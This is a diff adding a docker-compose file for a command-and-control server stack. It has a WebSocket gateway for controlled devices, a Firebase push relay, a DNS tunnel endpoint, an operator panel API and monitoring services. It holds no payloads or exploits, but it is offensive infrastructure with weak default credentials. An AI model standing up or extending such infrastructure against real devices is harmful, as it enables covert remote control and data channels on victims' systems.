@@ -1,0 +1,258 @@
+version: '3.8'
+
+services:
+  # ============================================================================
+  # DATABASE
+  # ============================================================================
+  sqlite-db:
+    image: sqlite:latest
+    container_name: c2-sqlite
+    volumes:
+      - ./c2.db:/data/c2.db
+      - ./schema.sql:/docker-entrypoint-initdb.d/schema.sql
+    environment:
+      SQLITE_DB: /data/c2.db
+    networks:
+      - c2-network
+    restart: unless-stopped
+
+  # ============================================================================
+  # C2 SERVER (WebSocket Gateway)
+  # ============================================================================
+  c2-server:
+    build:
+      context: .
+      dockerfile: Dockerfile.c2-server
+    container_name: c2-server
+    ports:
+      - "8080:8080"  # WebSocket endpoint for devices
+      - "9090:9090"  # Prometheus metrics
+    environment:
+      DATABASE_URL: "sqlite:///data/c2.db"
+      RUST_LOG: "c2_server=debug,info"
+      C2_LISTEN: "0.0.0.0:8080"
+      METRICS_LISTEN: "0.0.0.0:9090"
+    volumes:
+      - ./c2.db:/data/c2.db
+    depends_on:
+      - sqlite-db
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:9090/metrics"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  # ============================================================================
+  # MQTT BROKER
+  # ============================================================================
+  mqtt-broker:
+    image: eclipse-mosquitto:latest
+    container_name: c2-mqtt
+    ports:
+      - "1883:1883"  # MQTT unencrypted (internal only)
+      - "8883:8883"  # MQTT over TLS
+    volumes:
+      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf
+      - ./mosquitto-acl.txt:/mosquitto/config/acl.txt
+      - ./mosquitto-passwords.txt:/mosquitto/config/passwords.txt
+      - mosquitto-data:/mosquitto/data
+      - mosquitto-logs:/mosquitto/log
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "mosquitto_sub", "-h", "localhost", "-t", "$SYS/broker/uptime"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  # ============================================================================
+  # FCM RELAY SERVICE
+  # ============================================================================
+  fcm-relay:
+    build:
+      context: .
+      dockerfile: Dockerfile.fcm-relay
+    container_name: c2-fcm-relay
+    ports:
+      - "8081:8081"  # FCM webhook/registration endpoint
+    environment:
+      FIREBASE_PROJECT_ID: "${FIREBASE_PROJECT_ID}"
+      FIREBASE_KEY: "${FIREBASE_KEY}"
+      RUST_LOG: "fcm_relay=debug,info"
+      FCM_LISTEN: "0.0.0.0:8081"
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:8081/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  # ============================================================================
+  # DNS TUNNEL ENDPOINT
+  # ============================================================================
+  dns-tunnel:
+    build:
+      context: .
+      dockerfile: Dockerfile.dns-tunnel
+    container_name: c2-dns-tunnel
+    ports:
+      - "53:53/udp"  # DNS queries
+    environment:
+      RUST_LOG: "dns_tunnel=debug,info"
+      DNS_LISTEN: "0.0.0.0:53"
+      DNS_DOMAIN_BASE: "c2.example.com"
+    networks:
+      - c2-network
+    restart: unless-stopped
+    cap_add:
+      - NET_ADMIN
+    healthcheck:
+      test: ["CMD", "nslookup", "test.c2.example.com", "localhost"]
+      interval: 60s
+      timeout: 10s
+      retries: 3
+
+  # ============================================================================
+  # PANEL API SERVER
+  # ============================================================================
+  panel-api:
+    build:
+      context: .
+      dockerfile: Dockerfile.panel-api
+    container_name: c2-panel-api
+    ports:
+      - "3000:3000"  # Panel API
+    environment:
+      DATABASE_URL: "sqlite:///data/c2.db"
+      RUST_LOG: "panel_api=debug,info"
+      PANEL_LISTEN: "0.0.0.0:3000"
+      SECRET_KEY: "${PANEL_SECRET_KEY:-change-me-in-production}"
+    volumes:
+      - ./c2.db:/data/c2.db
+    depends_on:
+      - sqlite-db
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:3000/api/dashboard/test"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  # ============================================================================
+  # REVERSE PROXY (Nginx)
+  # ============================================================================
+  reverse-proxy:
+    image: nginx:latest
+    container_name: c2-proxy
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./nginx.conf:/etc/nginx/nginx.conf:ro
+      - ./certs:/etc/nginx/certs:ro
+    depends_on:
+      - c2-server
+      - panel-api
+      - fcm-relay
+      - dns-tunnel
+    networks:
+      - c2-network
+    restart: unless-stopped
+
+  # ============================================================================
+  # MONITORING (Prometheus)
+  # ============================================================================
+  prometheus:
+    image: prom/prometheus:latest
+    container_name: c2-prometheus
+    ports:
+      - "9091:9090"
+    volumes:
+      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus-data:/prometheus
+    command:
+      - "--config.file=/etc/prometheus/prometheus.yml"
+      - "--storage.tsdb.path=/prometheus"
+    networks:
+      - c2-network
+    restart: unless-stopped
+
+  # ============================================================================
+  # MONITORING (Grafana)
+  # ============================================================================
+  grafana:
+    image: grafana/grafana:latest
+    container_name: c2-grafana
+    ports:
+      - "3001:3000"
+    environment:
+      GF_SECURITY_ADMIN_PASSWORD: "${GRAFANA_PASSWORD:-admin}"
+      GF_USERS_ALLOW_SIGN_UP: "false"
+    volumes:
+      - grafana-data:/var/lib/grafana
+      - ./grafana-provisioning:/etc/grafana/provisioning:ro
+    depends_on:
+      - prometheus
+    networks:
+      - c2-network
+    restart: unless-stopped
+
+  # ============================================================================
+  # LOGGING (Optional: ELK Stack)
+  # ============================================================================
+  elasticsearch:
+    image: docker.elastic.co/elasticsearch/elasticsearch:8.0.0
+    container_name: c2-elasticsearch
+    environment:
+      - discovery.type=single-node
+      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"
+      - xpack.security.enabled=false
+    ports:
+      - "9200:9200"
+    volumes:
+      - elasticsearch-data:/usr/share/elasticsearch/data
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:9200/_cluster/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+  kibana:
+    image: docker.elastic.co/kibana/kibana:8.0.0
+    container_name: c2-kibana
+    ports:
+      - "5601:5601"
+    environment:
+      ELASTICSEARCH_HOSTS: "http://elasticsearch:9200"
+    depends_on:
+      - elasticsearch
+    networks:
+      - c2-network
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:5601/api/status"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+volumes:
+  mosquitto-data:
+  mosquitto-logs:
+  prometheus-data:
+  grafana-data:
+  elasticsearch-data:
+
+networks:
+  c2-network:
+    driver: bridge
